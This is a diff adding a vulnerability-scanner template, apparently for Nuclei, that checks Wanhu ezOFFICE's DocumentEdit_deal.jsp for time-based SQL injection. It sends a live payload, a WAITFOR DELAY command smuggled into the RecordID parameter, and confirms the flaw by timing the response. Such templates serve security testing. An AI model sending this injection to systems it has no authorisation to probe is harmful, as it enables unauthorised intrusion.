@@ -1,0 +1,30 @@
+id: poc-yaml-wanhu-ezoffice-documentedit-deal-sqli
+info:
+  name: 万户 ezOFFICE DocumentEdit_deal.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,两高一弱
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "rootPath"
+          - "saveHTML"
+        part: body
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "response_time > to_number(t1)"
+          - "response_time < to_number(t2)"
